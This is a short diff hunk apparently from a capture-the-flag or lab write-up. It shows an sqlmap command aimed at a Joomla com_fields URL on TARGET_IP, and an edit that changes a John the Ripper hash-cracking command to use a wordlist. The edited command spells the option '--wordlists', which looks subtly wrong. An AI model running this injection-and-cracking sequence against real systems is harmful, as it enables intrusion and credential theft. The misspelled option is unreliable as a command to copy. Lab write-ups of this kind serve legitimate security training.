@@ -137,7 +137,7 @@ sqlmap -u "http://TARGET_IP/index.php?option=com_fields&view=fields&layout=modal
 Save the password hash and crack it.
 
 ```bash
-john hash.txt
+john --wordlists=/usr/share/wordlists/common.txt hash.txt
 ```
 
 Possible credentials obtained:
